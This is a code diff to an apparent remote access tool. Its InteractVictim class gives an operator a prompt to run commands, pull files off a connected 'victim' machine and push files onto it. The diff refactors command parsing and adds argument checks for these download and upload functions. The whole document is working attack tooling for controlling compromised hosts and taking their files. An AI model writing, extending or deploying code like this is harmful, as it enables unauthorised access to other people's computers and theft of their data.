@@ -34,37 +34,40 @@ class InteractVictim():
     
         while self.conn:
         
-            command = (input(f"{self.id}-> ").strip(' '))
+            command = (input(f"{self.id}-> ").strip(' ')).split(' ')
 
-            if "help" == command:
+            if "help" == command[0] and 1 == len(command):
                 self._victim_help()
 
-            elif "back" == command:
+            elif "back" == command[0] and 1 == len(command):
                 break
 
-            elif "!" == command[:1]:
+            elif "!" == command[0][:1]:
                 
-                output = utils._exec_command(command[1:])
+                output = utils._exec_command(result = ' '.join(command).lstrip('!'))
 
                 if output:
                     print(output)
 
-            elif "download" == command[:8]:
+            elif "download" == command[0]:
 
-                utils._send(self.conn, command)
+                utils._send(self.conn, ' '.join(command))
 
-                file_name = command[9:]
+                file_name = command[1]
 
                 print(f"[+] Downloading {file_name}...")
                 file_data = utils._receive(self.conn)
 
                 utils._write_file(file_name, file_data)
 
-            elif "upload" == command[:6]:
+            elif "upload" == command[0]:
 
-                cmds = command.split(' ')
+                if not 3 == len(command):
+                    print("[!] Invalid Argument.")
+                    print("[+] Usage: upload file location.")
+                    continue
 
-                file_name = os.path.abspath(cmds[1]) # path of the file in the server
+                file_name = os.path.abspath(command[1]) # path of the file in the server
 
                 if utils._does_file_exists(file_name):
 
